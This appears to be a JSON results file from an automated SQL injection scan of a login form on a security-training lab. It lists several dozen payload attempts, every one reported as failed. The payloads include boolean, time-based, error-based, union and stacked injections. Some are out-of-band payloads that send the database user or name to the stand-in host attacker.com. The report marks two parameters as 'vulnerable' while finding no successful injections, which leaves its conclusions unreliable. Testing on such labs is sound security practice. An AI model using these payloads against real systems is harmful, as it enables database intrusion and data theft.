@@ -1,0 +1,282 @@
+{
+  "target_url": "https://0a520045033bf4518214538100ce008c.web-security-academy.net/login",
+  "assessment_summary": {
+    "total_parameters_tested": 3,
+    "vulnerable_parameters": 2,
+    "total_injection_tests": 36,
+    "successful_injections": 0,
+    "confidence_score": 0.0,
+    "risk_level": "NONE"
+  },
+  "vulnerable_parameters": [
+    "username",
+    "password"
+  ],
+  "successful_injections": [],
+  "recommendations": [
+    "No SQL injection vulnerabilities detected in this assessment",
+    "Continue regular security testing",
+    "Consider implementing additional security measures"
+  ],
+  "technical_details": {
+    "discovered_parameters": [
+      "csrf",
+      "username",
+      "password"
+    ],
+    "all_test_results": [
+      {
+        "payload": "' OR '1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.210923433303833,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 0.9442119598388672,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:05'--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.303267240524292,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SLEEP(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.231762409210205,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.500412940979004,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 0.9432070255279541,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL--",
+        "type": "union_based",
+        "success": false,
+        "response_time": 1.0258347988128662,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL--",
+        "type": "union_based",
+        "success": false,
+        "response_time": 1.1284842491149902,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT @@version--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.0428836345672607,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT database()--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.0071468353271484,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1265106201171875,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.3311550617218018,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR '1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.1252970695495605,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 0.9573986530303955,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:05'--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 0.9254481792449951,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SLEEP(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.0907864570617676,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.2277121543884277,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.4370455741882324,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL--",
+        "type": "union_based",
+        "success": false,
+        "response_time": 1.1254057884216309,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL--",
+        "type": "union_based",
+        "success": false,
+        "response_time": 1.2295806407928467,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT @@version--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.4126396179199219,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT database()--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.0671515464782715,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.2088344097137451,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.0832107067108154,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR '1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.3276591300964355,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 0.8692417144775391,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:05'--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1239850521087646,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SLEEP(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 2.6658918857574463,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.0254817008972168,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.126192331314087,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL--",
+        "type": "union_based",
+        "success": false,
+        "response_time": 1.0257530212402344,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL--",
+        "type": "union_based",
+        "success": false,
+        "response_time": 1.0364587306976318,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT @@version--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.0188939571380615,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT database()--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.0159306526184082,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.3312313556671143,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.2456402778625488,
+        "confidence": 0.0
+      }
+    ]
+  }
+}
